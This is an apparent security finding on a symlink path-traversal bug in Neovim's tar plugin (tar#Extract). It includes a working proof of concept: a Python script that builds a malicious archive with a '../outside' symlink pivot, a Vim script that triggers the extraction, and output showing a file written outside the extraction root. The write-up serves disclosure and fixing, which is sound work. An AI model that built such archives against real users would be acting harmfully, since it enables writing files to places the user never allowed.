# 01-tar-extract findings

## Broken invariant

`tar#Extract()` assumes that rejecting raw member names containing `..` or absolute roots, plus inserting `g:tar_secure=' -- '` before the filename, is enough to keep extraction of the selected member inside the current working directory. That invariant is false on the default GNU `tar` path: the sink resolves real filesystem symlink ancestors, so a lexically relative member name such as `pivot/owned.txt` can pass the Vim-side checks and still write outside the extraction root.

There is a second drift in the same path: the plugin treats `v:shell_error != 0` as if no side effect happened, but extracting the symlink pivot can still create the escape symlink before `tar#Extract()` reports failure.

## Input -> normalization -> policy gate -> sink

1. `tar#Browse()` lists attacker-controlled archive member names and binds `x` to `tar#Extract()` (`/home/node/workspace/neovim/runtime/autoload/tar.vim:233-245`; `/home/node/workspace/neovim/runtime/doc/pi_tar.txt:62-67`).
2. `tar#Extract()` reads the selected member name verbatim with `getline(".")` (`/home/node/workspace/neovim/runtime/autoload/tar.vim:609`).
3. The policy gate is string-only:
   - reject comment/header lines (`:612-614`)
   - reject raw leading `./` / `../` and reject any `..[/\\]` still present after `simplify(fname)` (`:616-620`)
   - reject raw absolute roots (`:621-633`)
4. `g:tar_secure=' -- '` only terminates tar option parsing (`/home/node/workspace/neovim/runtime/autoload/tar.vim:118`). The sink then shells out through `system(extractcmd." ".shellescape(tarball)." ".g:tar_secure.shellescape(fname))` across the extraction branches (`/home/node/workspace/neovim/runtime/autoload/tar.vim:635-746`; plain tar at `:642-648`).
5. If the extraction root already contains `pivot -> ../outside`, extracting `pivot/owned.txt` makes GNU `tar` resolve the write to `../outside/owned.txt`, outside the current working directory. A self-contained archive can create that condition by shipping both the symlink pivot and the nested file: selecting `pivot` first creates the symlink and returns an error, then selecting `pivot/owned.txt` succeeds and writes outside the extraction root.

## Minimal reproducer

This reproducer is self-contained: the archive ships both the symlink pivot and the nested file.

### File contents

```python
import io
import os
import tarfile

base = '/tmp/nvim-wiki-tar-nvim'
os.makedirs(f'{base}/extract', exist_ok=True)
os.makedirs(f'{base}/outside', exist_ok=True)

with tarfile.open(f'{base}/attack.tar', 'w') as tf:
    link = tarfile.TarInfo('pivot')
    link.type = tarfile.SYMTYPE
    link.mode = 0o777
    link.linkname = '../outside'
    tf.addfile(link)

    data = b'PWNED_FROM_NVIM\n'
    reg = tarfile.TarInfo('pivot/owned.txt')
    reg.size = len(data)
    reg.mode = 0o644
    tf.addfile(reg, io.BytesIO(data))
```

```vim
set nomore
set shortmess+=I
set runtimepath^=/home/node/workspace/neovim/runtime
runtime plugin/tarPlugin.vim
lcd /tmp/nvim-wiki-tar-nvim/extract
edit /tmp/nvim-wiki-tar-nvim/attack.tar
call cursor(search('^pivot$'), 1)
call tar#Extract()
call cursor(search('^pivot/owned.txt$'), 1)
call tar#Extract()
qa!
```

### Commands

```bash
cat >/tmp/create_tar_poc.py <<'EOF'
import io
import os
import tarfile

base = '/tmp/nvim-wiki-tar-nvim'
os.makedirs(f'{base}/extract', exist_ok=True)
os.makedirs(f'{base}/outside', exist_ok=True)

with tarfile.open(f'{base}/attack.tar', 'w') as tf:
    link = tarfile.TarInfo('pivot')
    link.type = tarfile.SYMTYPE
    link.mode = 0o777
    link.linkname = '../outside'
    tf.addfile(link)

    data = b'PWNED_FROM_NVIM\n'
    reg = tarfile.TarInfo('pivot/owned.txt')
    reg.size = len(data)
    reg.mode = 0o644
    tf.addfile(reg, io.BytesIO(data))
EOF

python3 /tmp/create_tar_poc.py
cat >/tmp/repro_tar_extract.vim <<'EOF'
set nomore
set shortmess+=I
set runtimepath^=/home/node/workspace/neovim/runtime
runtime plugin/tarPlugin.vim
lcd /tmp/nvim-wiki-tar-nvim/extract
edit /tmp/nvim-wiki-tar-nvim/attack.tar
call cursor(search('^pivot$'), 1)
call tar#Extract()
call cursor(search('^pivot/owned.txt$'), 1)
call tar#Extract()
qa!
EOF

/home/node/.nix-profile/bin/nvim --clean -u NONE -i NONE -n --headless -S /tmp/repro_tar_extract.vim
ls -l /tmp/nvim-wiki-tar-nvim/extract
ls -l /tmp/nvim-wiki-tar-nvim/outside/owned.txt
cat /tmp/nvim-wiki-tar-nvim/outside/owned.txt
```

### Expected vs actual

- **Expected:** the traversal guard should keep all writes under `/tmp/nvim-wiki-tar-nvim/extract`; `pivot/owned.txt` should either be blocked or be created only inside that directory.
- **Actual:** on this box the first extraction reports failure but creates `extract/pivot -> ../outside`, and the second extraction writes `/tmp/nvim-wiki-tar-nvim/outside/owned.txt`:

```text
***error*** (tar#Extract) tar -pxf /tmp/nvim-wiki-tar-nvim/attack.tar pivot: failed!
***note*** successfully extracted pivot/owned.txt

lrwxrwxrwx ... /tmp/nvim-wiki-tar-nvim/extract/pivot -> ../outside
-rw-r--r-- ... /tmp/nvim-wiki-tar-nvim/outside/owned.txt
PWNED_FROM_NVIM
```

## Affected files

- `/home/node/workspace/neovim/runtime/autoload/tar.vim:118`
  - `g:tar_secure` only stops option parsing; it does not constrain the resolved destination path.
- `/home/node/workspace/neovim/runtime/autoload/tar.vim:233-245`
  - `tar#Browse()` exposes attacker-controlled member names and binds `x` to `tar#Extract()`.
- `/home/node/workspace/neovim/runtime/autoload/tar.vim:609-648`
  - `tar#Extract()` reads the selected name, applies string-only validation, and shells out to the plain-tar extraction sink.
- `/home/node/workspace/neovim/runtime/autoload/tar.vim:650-746`
  - the same `g:tar_secure.shellescape(fname)` sink pattern is reused for gzip, bzip2, bzip3, xz, zstd, and lz4 extraction branches.
- `/home/node/workspace/neovim/runtime/doc/pi_tar.txt:62-67`
  - user-facing contract: `x` extracts the selected file from the archive browser.
- `/home/node/workspace/neovim/test/old/testdir/test_plugin_tar.vim:68-95`
  - current hardening tests cover raw traversal strings and absolute paths, but not symlink-ancestor resolution.
- `/home/node/workspace/neovim/test/old/testdir/test_plugin_tar.vim:217-323`
  - extraction tests cover happy-path archive formats, but not filesystem-resolution escapes or failure-with-side-effect behavior.

## Impact / severity

This is an arbitrary file write outside the intended extraction directory on the default GNU `tar` path. The selected archive member name crosses from untrusted listing text into a filesystem write sink after only raw-string validation; the code never validates the resolved destination path that the OS and `tar` will actually follow.

Reachability is practical:

- the archive can be self-contained by shipping a symlink pivot plus a nested file, as shown above;
- if the current working directory already contains an attacker-controlled symlinked subdirectory, a single `x` extraction is enough.

I would rate this as **moderate severity**:

- impact is outside-directory write with attacker-controlled contents;
- the surface is a default runtime plugin bound to a single keystroke while browsing an untrusted archive;
- the plugin has already received multiple traversal fixes, and this variant is the same normalization/use drift in a still-reachable extraction path.
